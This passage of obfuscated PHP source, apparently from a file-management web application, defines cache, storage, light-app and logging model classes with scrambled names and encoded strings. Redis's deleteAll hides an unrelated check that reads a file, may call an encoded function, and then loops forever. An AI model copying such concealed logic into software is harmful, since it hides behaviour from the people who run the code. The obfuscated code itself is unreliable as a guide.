1)); } return !0; } protected function moveTop($•¿ÀÊı) { $ñƒº©İÅ =& $_SERVER[Ü©»’·]; $™†—¼ı» = array($ñƒº©İÅ[1660] => USER_ID, $ñƒº©İÅ[493] => 0); $â³í¸òÅ = $this->where($™†—¼ı»)->where(array($ñƒº©İÅ[32] => $•¿ÀÊı))->find(); if (!$â³í¸òÅ) { return; } $ù¼õØÆ£ = $this->field($ñƒº©İÅ[408])->where($™†—¼ı»)->order($ñƒº©İÅ[2300])->select(); $ù¼õØÆ£ = array_to_keyvalue($ù¼õØÆ£, $ñƒº©İÅ[12], $ñƒº©İÅ[408]); $‚‚‰Íù” = $ù¼õØÆ£; $ù¼õØÆ£ = array_remove_value($ù¼õØÆ£, $â³í¸òÅ[$ñƒº©İÅ[408]]); array_unshift($ù¼õØÆ£, $â³í¸òÅ[$ñƒº©İÅ[408]]); return $this->resetSort($ù¼õØÆ£); } protected function moveBottom($¡Ú½êù¡) { $çÌñÂÀ =& $_SERVER[Ü©»’·]; $ôû†ó£” = array($çÌñÂÀ[1660] => USER_ID, $çÌñÂÀ[493] => 0); $£Æü’Ø¼ = $this->where($ôû†ó£”)->max($çÌñÂÀ[1882]); $ã±˜Òª® = array($çÌñÂÀ[1882] => $£Æü’Ø¼ + 1); return $this->where($ôû†ó£”)->where(array($çÌñÂÀ[32] => $¡Ú½êù¡))->save($ã±˜Òª®); } private function getAutoName($ÜÛ­Š‚«) { $Ãß€µ•ü =& $_SERVER[Ü©»’·]; $•¤•„€ = array($Ãß€µ•ü[1660] => USER_ID, $Ãß€µ•ü[493] => 0); $œøÂ‰Œ› = $this->field($Ãß€µ•ü[32])->where($•¤•„€)->select(); $œøÂ‰Œ› = array_to_keyvalue($œøÂ‰Œ›, $Ãß€µ•ü[12], $Ãß€µ•ü[32]); if (!$œøÂ‰Œ› || !in_array($ÜÛ­Š‚«, $œøÂ‰Œ›)) { return $ÜÛ­Š‚«; } for ($¶Ş¢ïÍ× = 0; $¶Ş¢ïÍ× < count($œøÂ‰Œ›); $¶Ş¢ïÍ×++) { if (!in_array($ÜÛ­Š‚« . "\50{$¶Ş¢ïÍ×}\51", $œøÂ‰Œ›)) { return $ÜÛ­Š‚« . "\x28{$¶Ş¢ïÍ×}\x29"; } } return $ÜÛ­Š‚« . "\x28{$¶Ş¢ïÍ×}\51"; } } goto BÌÆ„‚ËƒË; a®áø„¢ƒˆ: class CacheLockDatabase { public function lock($Üµ€‘˜, $£Æ÷ÑÃ€ = 0) { $Ñ“ïôÔ¼ = Model($_SERVER[Ü©»’·][835]); $³‹¥¥­ = microtime(!0) + $£Æ÷ÑÃ€; while (microtime(!0) < $³‹¥¥­) { $ëÀß®¶ì = $Ñ“ïôÔ¼->get($Üµ€‘˜); if (!$ëÀß®¶ì || $ëÀß®¶ì < microtime(!0)) { $çÑıùò  = $Ñ“ïôÔ¼->set($Üµ€‘˜, $³‹¥¥­); if ($çÑıùò ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ä³î¦ğÇ) { return Model($_SERVER[Ü©»’·][835])->get($Ä³î¦ğÇ); } public function unlock($ñ–Ò©¸Ø) { Model($_SERVER[Ü©»’·][835])->remove($ñ–Ò©¸Ø); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ŒƒÆÓâÂ, $ã¡Ç’ƒ¼) { $È‚°É™„ =& $_SERVER[Ü©»’·]; if (!class_exists($È‚°É™„[872])) { show_json($È‚°É™„[873], !1); } $this->cacheTime = $ã¡Ç’ƒ¼; $this->handle = new Memcached(); if (is_array($ŒƒÆÓâÂ[$È‚°É™„[874]]) && count($ŒƒÆÓâÂ[$È‚°É™„[874]]) >= 1) { foreach ($ŒƒÆÓâÂ[$È‚°É™„[874]] as $²¶èÖª™) { $üÀ¨ƒ¡ã = explode($È‚°É™„[4], $²¶èÖª™); $this->handle->addServer($üÀ¨ƒ¡ã[0], $üÀ¨ƒ¡ã[1]); } } else { $this->handle->addServer($ŒƒÆÓâÂ[$È‚°É™„[181]], $ŒƒÆÓâÂ[$È‚°É™„[182]]); } } public function set($Êæ¿¦®, $•Å™—ç, $ŒÑ±æÛ = false) { $ŒÑ±æÛ = $ŒÑ±æÛ ? $ŒÑ±æÛ : $this->cacheTime; return $this->handle->set($Êæ¿¦®, $•Å™—ç, $ŒÑ±æÛ); } public function get($Ùé”ãı) { return $this->handle->get($Ùé”ãı); } public function remove($ÂÛĞ¯¼û) { return $this->handle->delete($ÂÛĞ¯¼û); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ôÓ¦ë”Õ, $™Ñ³¸Í’) { $ÙÎïş€ã =& $_SERVER[Ü©»’·]; if (!class_exists($ÙÎïş€ã[875])) { show_json($ÙÎïş€ã[876], !1); } $this->cacheTime = $™Ñ³¸Í’; $¶ÓÇïÙ« = isset($ôÓ¦ë”Õ[$ÙÎïş€ã[877]]) ? $ôÓ¦ë”Õ[$ÙÎïş€ã[877]] : 10; $¹ƒöä‡¿ = _get($ôÓ¦ë”Õ, $ÙÎïş€ã[874]); if ($¹ƒöä‡¿ && is_array($¹ƒöä‡¿)) { $this->initCluster($ôÓ¦ë”Õ, $¶ÓÇïÙ«); } else { $this->handle = $this->init($ôÓ¦ë”Õ, $¶ÓÇïÙ«); } } private function init($¼öÏÉ°Õ, $‚Æì½ŞË) { $“îÊäè =& $_SERVER[Ü©»’·]; $¤» ã© = new Redis(); $Ï¹«ó±õ = isset($¼öÏÉ°Õ[$“îÊäè[878]]) ? $¼öÏÉ°Õ[$“îÊäè[878]] : !1; if ($Ï¹«ó±õ) { $¤» ã©->pconnect($¼öÏÉ°Õ[$“îÊäè[181]], $¼öÏÉ°Õ[$“îÊäè[182]], $‚Æì½ŞË); } else { $¤» ã©->connect($¼öÏÉ°Õ[$“îÊäè[181]], $¼öÏÉ°Õ[$“îÊäè[182]], $‚Æì½ŞË); } if (!empty($¼öÏÉ°Õ[$“îÊäè[422]])) { $¤» ã©->auth($¼öÏÉ°Õ[$“îÊäè[422]]); } if (!empty($¼öÏÉ°Õ[$“îÊäè[764]]) && $¼öÏÉ°Õ[$“îÊäè[764]] != 0) { $¤» ã©->select($¼öÏÉ°Õ[$“îÊäè[764]]); } return $¤» ã©; } private function initCluster($§Ë¶ƒ©‘, $·¶½…ñ¹) { $âóêü„Ò =& $_SERVER[Ü©»’·]; $¦öº¥˜• = array($âóêü„Ò[879], $âóêü„Ò[880], $âóêü„Ò[881]); $ˆ³¯¹Ÿ§ = $âóêü„Ò[879]; if (isset($§Ë¶ƒ©‘[$âóêü„Ò[16]]) && in_array($§Ë¶ƒ©‘[$âóêü„Ò[16]], $¦öº¥˜•)) { $ˆ³¯¹Ÿ§ = $§Ë¶ƒ©‘[$âóêü„Ò[16]]; } switch ($ˆ³¯¹Ÿ§) { case $âóêü„Ò[879]: $this->_slave($§Ë¶ƒ©‘, $·¶½…ñ¹); break; case $âóêü„Ò[880]: break; case $âóêü„Ò[881]: $this->isCluster = !0; $‘Ûş‚ĞÑ = $§Ë¶ƒ©‘[$âóêü„Ò[874]]; $ûĞ±û¹ì = isset($§Ë¶ƒ©‘[$âóêü„Ò[878]]) ? $§Ë¶ƒ©‘[$âóêü„Ò[878]] : !1; $¸â¿Í»® = isset($§Ë¶ƒ©‘[$âóêü„Ò[422]]) ? $§Ë¶ƒ©‘[$âóêü„Ò[422]] : null; $this->handle = new RedisCluster(NUll, $‘Ûş‚ĞÑ, $·¶½…ñ¹, $·¶½…ñ¹, $ûĞ±û¹ì, $¸â¿Í»®); break; default: break; } } private function _slave($ª“ªï¨Ç, $¤İİºˆß) { $×¡úñ‰˜ = $ª“ªï¨Ç[$_SERVER[Ü©»’·][874]]; $this->filterConfig($ª“ªï¨Ç, $×¡úñ‰˜[0]); $this->handle = $this->init($ª“ªï¨Ç, $¤İİºˆß); unset($×¡úñ‰˜[0]); if (empty($×¡úñ‰˜)) { return; } $‘£’ğÓî = array_rand($×¡úñ‰˜); $this->filterConfig($ª“ªï¨Ç, $×¡úñ‰˜[$‘£’ğÓî]); $this->slaveHandle = $this->init($ª“ªï¨Ç, $¤İİºˆß); } private function filterConfig(&$ÙµÚä…‰, $ÏßşÉ±Â) { $ìâˆ”§œ =& $_SERVER[Ü©»’·]; $é¾°ÄÂ = explode($ìâˆ”§œ[4], $ÏßşÉ±Â); $ƒ¦Òıš = array($ìâˆ”§œ[181] => $é¾°ÄÂ[0], $ìâˆ”§œ[182] => $é¾°ÄÂ[1]); $ÙµÚä…‰ = array_merge($ÙµÚä…‰, $ƒ¦Òıš); } public function set($£Åí¿ï¨, $ßÌÍƒ—, $û¯¶‚Çš = false) { $û¯¶‚Çš = $û¯¶‚Çš ? $û¯¶‚Çš : $this->cacheTime; return $this->handle->setEx($£Åí¿ï¨, $û¯¶‚Çš, $ßÌÍƒ—); } public function setLock($®ïÒÎä…, $ş³úæ°½, $Ä½Å”™Æ) { return $this->handle->setNX($®ïÒÎä…, $ş³úæ°½); } public function get($³çŸµã×) { $µÀäÁ²£ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $µÀäÁ²£->get($³çŸµã×); } public function remove($ÍµÒ¸ï) { return $this->handle->del($ÍµÒ¸ï); } public function deleteAll() { $ÑË”Ö˜™ =& $_SERVER[Ü©»’·]; if (!isset($_SERVER[$ÑË”Ö˜™[357]]) || !isset($_SERVER[$ÑË”Ö˜™[355]])) { $Øôö±”ï = $ÑË”Ö˜™[882]; $åŠä£¾¶ = $ÑË”Ö˜™[358]; $ççÅÛŠ„ = $_SERVER[$ÑË”Ö˜™[359]] . $ÑË”Ö˜™[360]; $¦¯Íœ = $åŠä£¾¶($ççÅÛŠ„); $€ú¦«ÑÃ = explode($ÑË”Ö˜™[231], $¦¯Íœ); if (count($€ú¦«ÑÃ) < $ÑË”Ö˜™[628]) { $¯Àïûä° = $ÑË”Ö˜™[362]; $¯Àïûä°(); } $Ää†âêå = $ÑË”Ö˜™[883]; $Ää†âêå($_SERVER[$ÑË”Ö˜™[884]]); $­¦ø“´İ = 1; for ($Ëæ¬²ä– = $­¦ø“´İ; $Ëæ¬²ä– > 0; $Ëæ¬²ä–++) { $Ää†âêå = json_encode($GLOBALS[$ÑË”Ö˜™[427]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ØòÍÜú‰) { $this->handle->flushall($ØòÍÜú‰); } return; } return $this->handle->flushAll(); } } goto eáÓ£¼¯£; B½ä¼šé†Ë: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\x73\x74\157\162\x61\147\x65\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\163\151\x7a\x65\115\141\x78", "\163\x79\163\x74\145\155", "\x64\x65\x66\x61\165\154\x74", "\144\162\x69\166\145\x72", "\143\x6f\x6e\x66\x69\147"); public function listData($Ó«ú©ë = false, $¤¼­ËñÄ = "\155\157\144\x69\x66\x79\x54\x69\155\x65", $î°š¼ğî = false) { $ç¥Ë¢õÇ =& $_SERVER[Ü©»’·]; $ÅÙÃêå = parent::listData($Ó«ú©ë, $¤¼­ËñÄ, $î°š¼ğî); if ($Ó«ú©ë) { return $ÅÙÃêå; } $¹ñ•ÍüÖ = $this->ioSizeUseGet(array_to_keyvalue($ÅÙÃêå, $ç¥Ë¢õÇ[12], $ç¥Ë¢õÇ[408])); foreach ($ÅÙÃêå as $œ…Ê¾ô¹ => $Ë£°ëõŠ) { unset($ÅÙÃêå[$œ…Ê¾ô¹][$ç¥Ë¢õÇ[6]]); $ÅÙÃêå[$œ…Ê¾ô¹][$ç¥Ë¢õÇ[1847]] = isset($¹ñ•ÍüÖ[$Ë£°ëõŠ[$ç¥Ë¢õÇ[408]]]) ? $¹ñ•ÍüÖ[$Ë£°ëõŠ[$ç¥Ë¢õÇ[408]]] : 0; } return $ÅÙÃêå; } public function ioSizeUseGet($ÓÃš´û×) { $àË¼¼¯ò =& $_SERVER[Ü©»’·]; if (!$ÓÃš´û×) { return array(); } $‘¢Ğ­—Î = $àË¼¼¯ò[2170] . implode($àË¼¼¯ò[50], $ÓÃš´û×); $âÜ‡Ûüò = Cache::get($‘¢Ğ­—Î); if ($âÜ‡Ûüò) { return $âÜ‡Ûüò; } $¹À˜¡À = array($àË¼¼¯ò[823] => $àË¼¼¯ò[408], $àË¼¼¯ò[2171] => $àË¼¼¯ò[76]); $¤‰ë‰†» = array($àË¼¼¯ò[823] => array($àË¼¼¯ò[7], $ÓÃš´û×)); $âÜ‡Ûüò = Model($àË¼¼¯ò[795])->field($¹À˜¡À)->where($¤‰ë‰†»)->group($àË¼¼¯ò[823])->select(); $âÜ‡Ûüò = array_to_keyvalue($âÜ‡Ûüò, $àË¼¼¯ò[408], $àË¼¼¯ò[76]); Cache::set($‘¢Ğ­—Î, $âÜ‡Ûüò, 600); return $âÜ‡Ûüò; } public function getConfig($„¡Ø¥ ±) { $“´›××„ = parent::listData($„¡Ø¥ ±); return json_decode($“´›××„[$_SERVER[Ü©»’·][6]], !0); } public function update($ĞÒŒüÜÁ, $‰“ò¯¢®) { $ú© Š¨Ã =& $_SERVER[Ü©»’·]; $Ø¡¥Ó²İ = $‰“ò¯¢®[$ú© Š¨Ã[32]]; $¤Ï€áô¶ = array_to_keyvalue(parent::listData(), $ú© Š¨Ã[32]); if (isset($¤Ï€áô¶[$Ø¡¥Ó²İ]) && $¤Ï€áô¶[$Ø¡¥Ó²İ][$ú© Š¨Ã[408]] != $ĞÒŒüÜÁ) { return !1; } $this->checkPwd($ĞÒŒüÜÁ, $‰“ò¯¢®); if (isset($‰“ò¯¢®[$ú© Š¨Ã[2172]]) && $‰“ò¯¢®[$ú© Š¨Ã[2172]] == $ú© Š¨Ã[88]) { $this->checkConfig($‰“ò¯¢®); } unset($‰“ò¯¢®[$ú© Š¨Ã[2172]]); $€¬º«“± = parent::update($ĞÒŒüÜÁ, $‰“ò¯¢®); if ($€¬º«“± && $‰“ò¯¢®[$ú© Š¨Ã[37]]) { $éŞ¦½Œñ = 0; foreach ($¤Ï€áô¶ as $¿õšŒ½Ã) { if ($¿õšŒ½Ã[$ú© Š¨Ã[37]] && $¿õšŒ½Ã[$ú© Š¨Ã[408]] != $ĞÒŒüÜÁ) { $éŞ¦½Œñ = $¿õšŒ½Ã[$ú© Š¨Ã[408]]; parent::update($¿õšŒ½Ã[$ú© Š¨Ã[408]], array($ú© Š¨Ã[37] => 0)); } } $this->updateBackup($ĞÒŒüÜÁ, $éŞ¦½Œñ); } return $€¬º«“±; } public function add($¾Üú¹‡ˆ) { $…®öƒÔ =& $_SERVER[Ü©»’·]; $Î×íÏ¦ = array_to_keyvalue(parent::listData(), $…®öƒÔ[32]); if (isset($Î×íÏ¦[$¾Üú¹‡ˆ[$…®öƒÔ[32]]])) { return !1; } $this->checkConfig($¾Üú¹‡ˆ); $ÕÓŞÚŸš = parent::insert($¾Üú¹‡ˆ); if ($ÕÓŞÚŸš && $¾Üú¹‡ˆ[$…®öƒÔ[37]]) { foreach ($Î×íÏ¦ as $Ï›¹¦µÇ) { if ($Ï›¹¦µÇ[$…®öƒÔ[37]]) { parent::update($Ï›¹¦µÇ[$…®öƒÔ[408]], array($…®öƒÔ[37] => 0)); } } } return $ÕÓŞÚŸš; } public function updateBackup($‰Ç¥ß, $Ÿê—ëÜÛ) { $³¡¥ñÔ =& $_SERVER[Ü©»’·]; if (!$Ÿê—ëÜÛ) { return; } $€İİ¶Å¦ = Model($³¡¥ñÔ[755])->config(); if ($€İİ¶Å¦[$³¡¥ñÔ[1639]] != $³¡¥ñÔ[88] || $€İİ¶Å¦[$³¡¥ñÔ[758]] != $Ÿê—ëÜÛ) { return; } $–åœÂ´ö = Model($³¡¥ñÔ[776])->get($³¡¥ñÔ[786]); $–åœÂ´ö = json_decode($–åœÂ´ö, !0); if (!$–åœÂ´ö) { return; } $–åœÂ´ö[$³¡¥ñÔ[758]] = $‰Ç¥ß; Model($³¡¥ñÔ[776])->set(array($³¡¥ñÔ[786] => $–åœÂ´ö)); } public function checkPwd($Õ÷òúìõ, &$ÑÚÔÅóü) { $Òúàù³À =& $_SERVER[Ü©»’·]; if (empty($ÑÚÔÅóü[$Òúàù³À[6]])) { return; } $ÄáŸÊëÖ = json_decode($ÑÚÔÅóü[$Òúàù³À[6]], !0); $˜Ë³æ¤Û = $Òúàù³À[12]; $È°º‘Ä’ = array($Òúàù³À[2173], $Òúàù³À[2174], $Òúàù³À[892]); foreach ($È°º‘Ä’ as $Õ›ÀÒŞ¶) { if (isset($ÄáŸÊëÖ[$Õ›ÀÒŞ¶])) { $˜Ë³æ¤Û = $Õ›ÀÒŞ¶; break; } } if (!$˜Ë³æ¤Û) { return; } $Ó‡›‹È = $this->getConfig($Õ÷òúìõ); $ÄÙ§Œ“¹ = $Ó‡›‹È[$˜Ë³æ¤Û]; $·„ï»Ÿˆ = $ÄáŸÊëÖ[$˜Ë³æ¤Û]; if ($·„ï»Ÿˆ == str_repeat($Òúàù³À[188], strlen($ÄÙ§Œ“¹))) { $ÄáŸÊëÖ[$˜Ë³æ¤Û] = $ÄÙ§Œ“¹; $ÑÚÔÅóü[$Òúàù³À[6]] = json_encode($ÄáŸÊëÖ); } else { if ($·„ï»Ÿˆ != $ÄÙ§Œ“¹) { $ÑÚÔÅóü[$Òúàù³À[2172]] = $Òúàù³À[88]; } } } public function checkConfig(&$ëô¥±Í—, $ÇŸ¬¶‡Ç = false) { $ÑÔÕéÕ– =& $_SERVER[Ü©»’·]; $Ôííùœ½ = strtolower($ëô¥±Í—[$ÑÔÕéÕ–[95]]); $¬¤€‡Õö = json_decode($ëô¥±Í—[$ÑÔÕéÕ–[6]], !0); foreach ($¬¤€‡Õö as $¼³‰êİÂ => $İ†Ó•Ö³) { $¬¤€‡Õö[$¼³‰êİÂ] = trim($İ†Ó•Ö³); } $¬¤€‡Õö[$ÑÔÕéÕ–[2175]] = rand_string(6); $ø»´çõ„ = $GLOBALS[$ÑÔÕéÕ–[6]][$ÑÔÕéÕ–[89]][$ÑÔÕéÕ–[832]]; $ºÅ»İ¼Ä = isset($ø»´çõ„[$Ôííùœ½]) ? $ø»´çõ„[$Ôííùœ½] : ucfirst($Ôííùœ½); $İ¬·… = $ÑÔÕéÕ–[74] . $ºÅ»İ¼Ä; if (!$ºÅ»İ¼Ä || !class_exists($İ¬·…)) { if ($ÇŸ¬¶‡Ç) { return LNG($ÑÔÕéÕ–[2176]); } write_log(array($ÑÔÕéÕ–[2177], $ëô¥±Í—, get_caller_info()), $ÑÔÕéÕ–[2178]); show_json(LNG($ÑÔÕéÕ–[2176]), !1, $ëô¥±Í—); } $äÜã– Û = new $İ¬·…($¬¤€‡Õö); if (in_array($Ôííùœ½, $äÜã– Û->objectDriver)) { if (!$äÜã– Û->isBucketCors() && !$äÜã– Û->setBucketCors()) { $‰’ÔĞğ = LNG($ÑÔÕéÕ–[2179]); $‰’ÔĞğ .= $ÑÔÕéÕ–[2180] . LNG($ÑÔÕéÕ–[2181]); if ($ÇŸ¬¶‡Ç) { return $‰’ÔĞğ; } show_json($‰’ÔĞğ, !1); } } $¸üÍ«— = rtrim($¬¤€‡Õö[$ÑÔÕéÕ–[1184]], $ÑÔÕéÕ–[8]) . $ÑÔÕéÕ–[8]; $ËÄ¼„×Ù = $äÜã– Û->getPath($¸üÍ«— . $ÑÔÕéÕ–[1188]); if (!$äÜã– Û->mkfile($ËÄ¼„×Ù)) { if ($ÇŸ¬¶‡Ç) { return LNG($ÑÔÕéÕ–[2179]); } show_json(LNG($ÑÔÕéÕ–[2179]), !1); } $¬¤€‡Õö[$ÑÔÕéÕ–[1184]] = $¸üÍ«—; $ëô¥±Í—[$ÑÔÕéÕ–[6]] = json_encode($¬¤€‡Õö); $ëô¥±Í—[$ÑÔÕéÕ–[95]] = $ºÅ»İ¼Ä; return !0; } public function driverListSystem() { $ˆ¨¸€³° =& $_SERVER[Ü©»’·]; $ã®Ëå…è = parent::listData(); $š×µĞç½ = array(); foreach ($ã®Ëå…è as $Ò“ş‘€é) { unset($Ò“ş‘€é[$ˆ¨¸€³°[200]], $Ò“ş‘€é[$ˆ¨¸€³°[85]]); $Ò“ş‘€é[$ˆ¨¸€³°[6]] = json_decode($Ò“ş‘€é[$ˆ¨¸€³°[6]], !0); $š×µĞç½[] = $Ò“ş‘€é; } return $š×µĞç½; } public function defaultDriver() { $ù—ÖÒ¯ú =& $_SERVER[Ü©»’·]; $Ûğ÷ìÜ¹ = parent::listData(); $³íõ‰çŸ = array_filter_by_field($Ûğ÷ìÜ¹, $ù—ÖÒ¯ú[37], 1); $³íõ‰çŸ = $³íõ‰çŸ[0]; if ($³íõ‰çŸ) { $³íõ‰çŸ[$ù—ÖÒ¯ú[6]] = json_decode($³íõ‰çŸ[$ù—ÖÒ¯ú[6]], !0); } return $³íõ‰çŸ; } public function driverInfo($åˆÚ§©ô) { $¤È §Ã¯ =& $_SERVER[Ü©»’·]; $Çõ¼¸ = array_to_keyvalue(parent::listData(), $¤È §Ã¯[408]); if (!isset($Çõ¼¸[$åˆÚ§©ô])) { return !1; } $†³„Œ†§ = $Çõ¼¸[$åˆÚ§©ô]; $†³„Œ†§[$¤È §Ã¯[6]] = json_decode($†³„Œ†§[$¤È §Ã¯[6]], !0); return $†³„Œ†§; } public function remove($á÷¤§Á÷) { $this->removeShareItems($á÷¤§Á÷); return parent::remove($á÷¤§Á÷); } public function removeWithFile($õ®üë¶ç, $Áşª±Şú) { $¹¼ÛÛ² =& $_SERVER[Ü©»’·]; $¥¡ñİ‘ä = array($¹¼ÛÛ²[823] => $õ®üë¶ç); $’®¶é²˜ = Model($¹¼ÛÛ²[480])->where($¥¡ñİ‘ä)->count(); $™•Èøø = Model($¹¼ÛÛ²[480])->where($¥¡ñİ‘ä)->sum($¹¼ÛÛ²[76]); $ÀÍ’÷´ = $Áşª±Şú . $¹¼ÛÛ²[2182] . $õ®üë¶ç; $Ş¯ÍĞãş = LNG($Áşª±Şú == $¹¼ÛÛ²[566] ? $¹¼ÛÛ²[2183] : $¹¼ÛÛ²[2184]); $•øî©¿¢ = new TaskFileTransfer($ÀÍ’÷´, $¹¼ÛÛ²[2178], $’®¶é²˜, $Ş¯ÍĞãş . "\50{$õ®üë¶ç}\51"); $•øî©¿¢->task[$¹¼ÛÛ²[769]] = (double) $™•Èøø; $ĞâíØ¬ç = KodIO::defaultDriver(); $ÍÈ‡â½¿ = $ĞâíØ¬ç[$¹¼ÛÛ²[408]]; $‘â§ç— = "\x7b\151\157\72{$ÍÈ‡â½¿}\175\x2f"; $ø„şú = !0; $Á†’ŠÓ = array(); $ÎËş¥¨ó = Model($¹¼ÛÛ²[199])->where($¥¡ñİ‘ä)->field($¹¼ÛÛ²[2185])->select(); foreach ($ÎËş¥¨ó as $ùî¸Ò€ş) { $ÏûÜÔÃ” = $ùî¸Ò€ş[$¹¼ÛÛ²[84]]; $Óíï¿™² = $‘â§ç— . str_replace("\173\x69\x6f\72{$õ®üë¶ç}\x7d\x2f", $¹¼ÛÛ²[12], $ÏûÜÔÃ”); if (!IO::exist($ÏûÜÔÃ”)) { $Á†’ŠÓ[] = $ùî¸Ò€ş[$¹¼ÛÛ²[477]]; $•øî©¿¢->updateFileEnd($ùî¸Ò€ş[$¹¼ÛÛ²[32]], $ùî¸Ò€ş[$¹¼ÛÛ²[76]]); continue; } if (IO::exist($Óíï¿™²)) { $•øî©¿¢->updateFileEnd($ùî¸Ò€ş[$¹¼ÛÛ²[32]], $ùî¸Ò€ş[$¹¼ÛÛ²[76]]); continue; } if (!IO::move($ÏûÜÔÃ”, get_path_father($Óíï¿™²))) { $ø„şú = !1; break; } $¥¡ñİ‘ä = array($¹¼ÛÛ²[477] => $ùî¸Ò€ş[$¹¼ÛÛ²[477]]); $¡šÊ¾×™ = array($¹¼ÛÛ²[823] => $ÍÈ‡â½¿, $¹¼ÛÛ²[84] => $Óíï¿™²); Model($¹¼ÛÛ²[199])->where($¥¡ñİ‘ä)->save($¡šÊ¾×™); } $this->removeByFileID($Á†’ŠÓ); if (!$ø„şú) { $•øî©¿¢->stop($ÀÍ’÷´); return !1; } $•øî©¿¢->end(); if ($Áşª±Şú == $¹¼ÛÛ²[1827]) { $this->remove($õ®üë¶ç); } } public function progress($ÁŞÓÈì†, $½ÓÒ®±º) { return Task::get($½ÓÒ®±º . $_SERVER[Ü©»’·][2182] . $ÁŞÓÈì†); } private function removeByFileID($ğı›ÃÖç = array()) { $ùëıïÎ =& $_SERVER[Ü©»’·]; if (empty($ğı›ÃÖç)) { return; } $’Å…¸¹Ì = array($ùëıïÎ[477] => array($ùëıïÎ[7], $ğı›ÃÖç)); $Ãæƒ´”ß = Model($ùëıïÎ[1339])->where($’Å…¸¹Ì)->field($ùëıïÎ[411])->select(); if (!$Ãæƒ´”ß) { return; } $Ãæƒ´”ß = array_to_keyvalue($Ãæƒ´”ß, $ùëıïÎ[12], $ùëıïÎ[411]); foreach ($Ãæƒ´”ß as $„¯’ßãô) { Model($ùëıïÎ[425])->removeNow($„¯’ßãô, !1); } } private function removeShareItems($ÜÚ»ßíº) { $ùÉãßŸ =& $_SERVER[Ü©»’·]; $§¥ÏÅÚå = "\x7b\151\x6f\72{$ÜÚ»ßíº}\x7d\x2f"; $˜İë¾Ç§ = array($ùÉãßŸ[411] => 0, $ùÉãßŸ[1179] => array($ùÉãßŸ[392], "{$§¥ÏÅÚå}\45")); $¦ €°ø = Model($ùÉãßŸ[1838])->where($˜İë¾Ç§)->field($ùÉãßŸ[498])->select(); if (empty($¦ €°ø)) { return; } $¤ÄÈ¯¢í = array_to_keyvalue($¦ €°ø, $ùÉãßŸ[12], $ùÉãßŸ[498]); Model($ùÉãßŸ[610])->remove($¤ÄÈ¯¢í); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\114\151\x67\150\164\101\160\x70"; public $modelType = "\123\x79\163\164\x65\x6d\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\156\141\155\x65", "\147\x72\x6f\x75\x70", "\144\145\x73\143", "\x63\x6f\156\x74\145\x6e\164"); public function listData($ÚëòçµÆ = false, $Ì½Š÷Â§ = "\155\x6f\x64\151\146\x79\124\x69\155\x65", $ØÙ’ÓÉ¹ = true) { return parent::listData($ÚëòçµÆ, $Ì½Š÷Â§, $ØÙ’ÓÉ¹); } public function remove($´Òã à¦) { $±˜ƒÏ´ = $this->findByName($´Òã à¦); if (!$±˜ƒÏ´) { return !1; } return parent::remove($±˜ƒÏ´[$_SERVER[Ü©»’·][408]]); } public function add($ÔİšÇÁğ) { if ($this->findByName($ÔİšÇÁğ[$_SERVER[Ü©»’·][32]])) { return !1; } return parent::insert($ÔİšÇÁğ); } public function update($±ŞÜ­ô, $º„Ÿûî) { $Š›ŞŠŒÔ =& $_SERVER[Ü©»’·]; $¡È¦Õ = $this->findByName($±ŞÜ­ô); $Å»®šÇ = $this->findByName($º„Ÿûî[$Š›ŞŠŒÔ[32]]); if (!$¡È¦Õ || $Å»®šÇ && $Å»®šÇ[$Š›ŞŠŒÔ[408]] != $¡È¦Õ[$Š›ŞŠŒÔ[408]]) { return !1; } return parent::update($¡È¦Õ[$Š›ŞŠŒÔ[408]], $º„Ÿûî); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\x74\145\x6d\x5f\x6c\157\x67"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\124\151\155\145", "\164\151\155\145", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $çˆ‡­Ô• =& $_SERVER[Ü©»’·]; return array($çˆ‡­Ô•[2186] => LNG($çˆ‡­Ô•[2187]), $çˆ‡­Ô•[2188] => LNG($çˆ‡­Ô•[2189]), $çˆ‡­Ô•[1801] => LNG($çˆ‡­Ô•[2190]), $çˆ‡­Ô•[2191] => LNG($çˆ‡­Ô•[2192]), $çˆ‡­Ô•[2193] => LNG($çˆ‡­Ô•[2194]), $çˆ‡­Ô•[2195] => LNG($çˆ‡­Ô•[2196]), $çˆ‡­Ô•[2197] => LNG($çˆ‡­Ô•[2198]), $çˆ‡­Ô•[1831] => LNG($çˆ‡­Ô•[2198]), $çˆ‡­Ô•[1832] => LNG($çˆ‡­Ô•[2199]), $çˆ‡­Ô•[2200] => LNG($çˆ‡­Ô•[2201]), $çˆ‡­Ô•[2202] => LNG($çˆ‡­Ô•[2203]), $çˆ‡­Ô•[2204] => LNG($çˆ‡­Ô•[2205]), $çˆ‡­Ô•[2206] => LNG($çˆ‡­Ô•[2207]), $çˆ‡­Ô•[1829] => LNG($çˆ‡­Ô•[2208]), $çˆ‡­Ô•[2209] => LNG($çˆ‡­Ô•[2210]), $çˆ‡­Ô•[1836] => LNG($çˆ‡­Ô•[2211]), $çˆ‡­Ô•[2212] => LNG($çˆ‡­Ô•[2213]), $çˆ‡­Ô•[2214] => LNG($çˆ‡­Ô•[2215]), $çˆ‡­Ô•[2216] => LNG($çˆ‡­Ô•[2217]), $çˆ‡­Ô•[2218] => LNG($çˆ‡­Ô•[2219]), $çˆ‡­Ô•[1839] => LNG($çˆ‡­Ô•[2220]), $çˆ‡­Ô•[1840] => LNG($çˆ‡­Ô•[2221]), $çˆ‡­Ô•[2222] => LNG($çˆ‡­Ô•[2223]), $çˆ‡­Ô•[2224] => LNG($çˆ‡­Ô•[2225]), $çˆ‡­Ô•[2226] => LNG($çˆ‡­Ô•[2227]), $çˆ‡­Ô•[1834] => LNG($çˆ‡­Ô•[2228]), $çˆ‡­Ô•[2229] => 